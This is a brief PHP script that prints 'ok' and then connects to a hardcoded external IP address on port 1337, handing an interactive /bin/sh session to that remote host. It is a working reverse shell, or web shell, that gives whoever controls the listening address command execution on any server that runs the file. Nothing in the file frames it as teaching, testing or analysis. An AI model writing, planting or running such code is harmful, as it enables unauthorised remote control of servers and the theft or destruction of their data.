<?php

echo("ok");
$ip = '2.10.141.195';
$port = 1337;

$sock = fsockopen($ip, $port);
$proc = proc_open("/bin/sh -i", [
  0 => $sock,
  1 => $sock,
  2 => $sock
], $pipes);

?>
